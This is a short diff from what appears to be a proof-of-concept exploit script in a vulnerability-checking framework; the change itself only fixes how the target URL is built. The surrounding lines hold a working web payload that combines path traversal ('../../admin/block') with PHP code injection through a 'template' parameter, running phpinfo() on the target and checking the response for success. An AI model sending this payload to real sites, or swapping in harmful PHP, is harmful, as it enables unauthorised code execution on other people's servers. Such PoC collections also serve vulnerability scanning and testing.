@@ -39,8 +39,7 @@ class Poc(ABPoc):
             s.get(self.target)
             o = urlparse.urlparse(self.target)
             payload = "/yp/business/?file=../../admin/block&action=post&blockid=eval&template=<?php phpinfo();exit();?>"
-            target = o.hostname
-            url = target + payload
+            url = self.target + payload
             r = s.get(url)
 
             if r.status_code == 200 and  'system' in r.text:
